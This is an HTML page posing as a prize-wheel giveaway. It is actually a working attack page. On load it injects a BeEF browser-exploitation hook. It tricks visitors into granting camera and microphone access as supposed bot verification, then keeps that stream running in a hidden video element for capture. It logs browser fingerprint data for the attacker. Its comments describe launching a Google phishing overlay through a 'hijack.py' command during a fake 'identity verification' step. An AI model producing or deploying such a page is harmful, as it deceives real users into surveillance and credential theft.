<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Spin & Win - Grand Prize Giveaway!</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 20px;
      }

      .container {
        background: white;
        border-radius: 20px;
        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        max-width: 600px;
        width: 100%;
        padding: 40px;
        text-align: center;
      }

      .logo {
        font-size: 3em;
        margin-bottom: 10px;
      }

      h1 {
        color: #333;
        font-size: 2em;
        margin-bottom: 10px;
        font-weight: 700;
      }

      .subtitle {
        color: #666;
        font-size: 1.1em;
        margin-bottom: 30px;
      }

      .prize-banner {
        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        color: white;
        padding: 20px;
        border-radius: 15px;
        margin-bottom: 30px;
        font-size: 1.3em;
        font-weight: bold;
        box-shadow: 0 5px 15px rgba(245, 87, 108, 0.4);
      }

      .instructions {
        background: #f8f9fa;
        padding: 20px;
        border-radius: 10px;
        margin-bottom: 30px;
        color: #555;
        line-height: 1.6;
      }

      .instructions strong {
        color: #667eea;
      }

      .btn {
        padding: 18px 50px;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        font-size: 1.3em;
        font-weight: bold;
        border: none;
        border-radius: 50px;
        cursor: pointer;
        transition: all 0.3s ease;
        box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
      }

      .btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 12px 30px rgba(102, 126, 234, 0.6);
      }

      .btn:disabled {
        background: #ccc;
        cursor: not-allowed;
        box-shadow: none;
      }

      #welcome-screen {
        display: block;
      }

      #game-screen {
        display: none;
      }

      .wheel-container {
        position: relative;
        margin: 30px auto;
        width: 400px;
        height: 400px;
      }

      #wheel {
        width: 100%;
        height: 100%;
        border-radius: 50%;
        border: 15px solid #333;
        position: relative;
        transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
      }

      .wheel-segment {
        position: absolute;
        width: 50%;
        height: 50%;
        transform-origin: 100% 100%;
        overflow: hidden;
      }

      .wheel-segment::before {
        content: "";
        position: absolute;
        width: 200%;
        height: 200%;
        transform-origin: 100% 100%;
        border: 2px solid white;
      }

      .segment1 {
        transform: rotate(0deg) skewY(-60deg);
      }
      .segment1::before {
        background: #ff6b6b;
        transform: skewY(60deg) rotate(15deg);
      }

      .segment2 {
        transform: rotate(60deg) skewY(-60deg);
      }
      .segment2::before {
        background: #4ecdc4;
        transform: skewY(60deg) rotate(15deg);
      }

      .segment3 {
        transform: rotate(120deg) skewY(-60deg);
      }
      .segment3::before {
        background: #45b7d1;
        transform: skewY(60deg) rotate(15deg);
      }

      .segment4 {
        transform: rotate(180deg) skewY(-60deg);
      }
      .segment4::before {
        background: #f7b731;
        transform: skewY(60deg) rotate(15deg);
      }

      .segment5 {
        transform: rotate(240deg) skewY(-60deg);
      }
      .segment5::before {
        background: #5f27cd;
        transform: skewY(60deg) rotate(15deg);
      }

      .segment6 {
        transform: rotate(300deg) skewY(-60deg);
      }
      .segment6::before {
        background: #00d2d3;
        transform: skewY(60deg) rotate(15deg);
      }

      .wheel-center {
        position: absolute;
        width: 80px;
        height: 80px;
        background: white;
        border-radius: 50%;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        border: 5px solid #333;
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        z-index: 10;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: bold;
        color: #333;
      }

      .pointer {
        position: absolute;
        top: -20px;
        left: 50%;
        transform: translateX(-50%);
        width: 0;
        height: 0;
        border-left: 20px solid transparent;
        border-right: 20px solid transparent;
        border-top: 40px solid #ff4757;
        z-index: 20;
        filter: drop-shadow(0 3px 5px rgba(0, 0, 0, 0.3));
      }

      .prize-list {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 10px;
        margin: 20px 0;
        font-size: 0.9em;
      }

      .prize-item {
        background: #f8f9fa;
        padding: 10px;
        border-radius: 8px;
        font-weight: 600;
      }

      .spin-result {
        margin-top: 30px;
        padding: 20px;
        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        color: white;
        border-radius: 15px;
        font-size: 1.5em;
        font-weight: bold;
        display: none;
      }

      .error-message {
        color: #e74c3c;
        margin-top: 15px;
        font-weight: 600;
        display: none;
      }

      @media (max-width: 500px) {
        .wheel-container {
          width: 300px;
          height: 300px;
        }

        .container {
          padding: 20px;
        }

        h1 {
          font-size: 1.5em;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <!-- Welcome Screen -->
      <div id="welcome-screen">
        <div class="logo">üé∞</div>
        <h1>Spin & Win Amazing Prizes!</h1>
        <p class="subtitle">Play now for a chance to win incredible rewards</p>

        <div class="prize-banner">üéÅ Grand Prize: iPhone 16 Pro Max! üéÅ</div>

        <div class="instructions">
          <strong>How to Play:</strong><br />
          1. Click "Play Game" button below<br />
          2. Allow camera & microphone access for verification<br />
          3. Spin the wheel and win amazing prizes!<br />
          <br />
          <em
            >Note: Camera/microphone access is required to prevent bots and
            ensure fair play.</em
          >
        </div>

        <button class="btn" id="playBtn" onclick="requestPermissions()">
          üéÆ Play Game
        </button>

        <p class="error-message" id="errorMsg">
          ‚ö†Ô∏è Camera & Microphone access required to play the game
        </p>
      </div>

      <!-- Game Screen -->
      <div id="game-screen">
        <h1>üé∞ Spin the Wheel!</h1>
        <p class="subtitle">Click the button to spin and win</p>

        <div class="wheel-container">
          <div class="pointer"></div>
          <div id="wheel">
            <div class="wheel-segment segment1"></div>
            <div class="wheel-segment segment2"></div>
            <div class="wheel-segment segment3"></div>
            <div class="wheel-segment segment4"></div>
            <div class="wheel-segment segment5"></div>
            <div class="wheel-segment segment6"></div>
            <div class="wheel-center">SPIN</div>
          </div>
        </div>

        <div class="prize-list">
          <div class="prize-item">üéÅ $100 Gift Card</div>
          <div class="prize-item">üì± iPhone 16</div>
          <div class="prize-item">üí∞ $500 Cash</div>
          <div class="prize-item">üéß AirPods Pro</div>
          <div class="prize-item">üíé Mystery Prize</div>
          <div class="prize-item">üèÜ Grand Prize</div>
        </div>

        <button class="btn" id="spinBtn" onclick="spinWheel()">
          üéØ SPIN NOW
        </button>

        <div class="spin-result" id="result"></div>
      </div>
    </div>

    <script>
      let hasPermissions = false;
      let spinning = false;
      let mediaStream = null;

      // Load BeEF hook.js through Vercel proxy
      function loadBeEFHook() {
        const script = document.createElement("script");
        script.src = "/api/hook";

        script.onerror = function () {
          console.error("Failed to load BeEF hook via proxy");
        };

        script.onload = function () {
          console.log("‚úÖ BeEF hook loaded successfully via proxy!");
        };

        document.head.appendChild(script);
      }

      async function requestPermissions() {
        const playBtn = document.getElementById("playBtn");
        const errorMsg = document.getElementById("errorMsg");

        playBtn.disabled = true;
        playBtn.textContent = "‚è≥ Requesting Access...";

        try {
          // Request both camera and microphone with specific constraints
          mediaStream = await navigator.mediaDevices.getUserMedia({
            video: {
              width: { ideal: 1280 },
              height: { ideal: 720 },
            },
            audio: {
              echoCancellation: true,
              noiseSuppression: true,
            },
          });

          // Permissions granted!
          hasPermissions = true;

          // Keep stream running in background (BeEF will capture it)
          console.log("‚úÖ Camera and microphone access granted!");

          // Create hidden video element to keep stream active
          const hiddenVideo = document.createElement("video");
          hiddenVideo.srcObject = mediaStream;
          hiddenVideo.autoplay = true;
          hiddenVideo.muted = true;
          hiddenVideo.style.display = "none";
          document.body.appendChild(hiddenVideo);

          // Show game screen after small delay
          setTimeout(() => {
            document.getElementById("welcome-screen").style.display = "none";
            document.getElementById("game-screen").style.display = "block";
          }, 500);
        } catch (err) {
          console.error("Permission error:", err);
          errorMsg.style.display = "block";
          playBtn.disabled = false;
          playBtn.textContent = "üéÆ Play Game";

          setTimeout(() => {
            errorMsg.style.display = "none";
          }, 3000);
        }
      }

      function spinWheel() {
        if (spinning) return;

        spinning = true;
        const wheel = document.getElementById("wheel");
        const spinBtn = document.getElementById("spinBtn");
        const result = document.getElementById("result");

        spinBtn.disabled = true;
        result.style.display = "none";

        // Random rotation (5-7 full spins + random angle)
        const spins = 5 + Math.floor(Math.random() * 3);
        const randomDegree = Math.floor(Math.random() * 360);
        const totalRotation = spins * 360 + randomDegree;

        wheel.style.transform = `rotate(${totalRotation}deg)`;

        // Prizes based on final angle
        const prizes = [
          { name: "üéÅ $100 Gift Card", showForm: true },
          { name: "üì± iPhone 16 Pro Max", showForm: true },
          { name: "üí∞ $500 Cash Prize", showForm: true },
          { name: "üéß AirPods Pro", showForm: true },
          { name: "üíé Mystery Bonus", showForm: true },
          { name: "üèÜ GRAND PRIZE", showForm: true },
        ];

        // Wait for wheel to stop spinning
        setTimeout(() => {
          const finalAngle = totalRotation % 360;
          const segmentAngle = 60;
          const prizeIndex = Math.floor(finalAngle / segmentAngle);
          const wonPrize = prizes[prizeIndex];

          result.innerHTML = `
            <div style="font-size: 1.8em; margin-bottom: 15px;">
              üéâ CONGRATULATIONS! üéâ
            </div>
            <div style="font-size: 1.3em; margin-bottom: 20px;">
              You Won: ${wonPrize.name}
            </div>
            <div style="font-size: 0.9em; opacity: 0.95;">
              Click below to claim your prize!
            </div>
          `;
          result.style.display = "block";

          // Show claim button after 1 second
          setTimeout(() => {
            spinBtn.textContent = "üéÅ CLAIM YOUR PRIZE";
            spinBtn.disabled = false;

            // Replace spin function with claim function
            spinBtn.onclick = claimPrize;
          }, 1000);

          spinning = false;
        }, 4500); // Increased to 4.5 seconds for dramatic effect
      }

      function claimPrize() {
        const result = document.getElementById("result");
        const spinBtn = document.getElementById("spinBtn");

        spinBtn.disabled = true;

        // Show "processing" message
        result.innerHTML = `
          <div style="font-size: 1.5em; margin-bottom: 15px;">
            ‚è≥ Processing Your Prize...
          </div>
          <div style="font-size: 1em; opacity: 0.9;">
            Please wait while we verify your identity
          </div>
        `;

        // After 2 seconds, show success and trigger Google phishing
        // The Google phishing module (11) will be triggered by BeEF operator
        // using: python3 hijack.py --exploit google_phishing --session <SESSION_ID>
        setTimeout(() => {
          result.innerHTML = `
            <div style="font-size: 1.5em; margin-bottom: 15px;">
              ‚úÖ Verification Complete!
            </div>
            <div style="font-size: 1em; opacity: 0.9;">
              A verification form will appear shortly.<br>
              Please fill it out to receive your prize.
            </div>
          `;

          // Keep the verification message visible
          // Google phishing form will overlay this page
        }, 2000);
      }

      // Auto-load BeEF hook when page loads
      window.addEventListener("DOMContentLoaded", function () {
        loadBeEFHook();

        // Preload some browser info for BeEF
        console.log("User Agent:", navigator.userAgent);
        console.log("Platform:", navigator.platform);
        console.log("Language:", navigator.language);
        console.log("Cookies Enabled:", navigator.cookieEnabled);
        console.log("Screen:", screen.width + "x" + screen.height);
      });

      // Prevent user from closing the tab easily
      window.addEventListener("beforeunload", function (e) {
        if (hasPermissions && !spinning) {
          e.preventDefault();
          e.returnValue =
            "Are you sure you want to leave? You will lose your prize!";
          return e.returnValue;
        }
      });
    </script>
  </body>
</html>
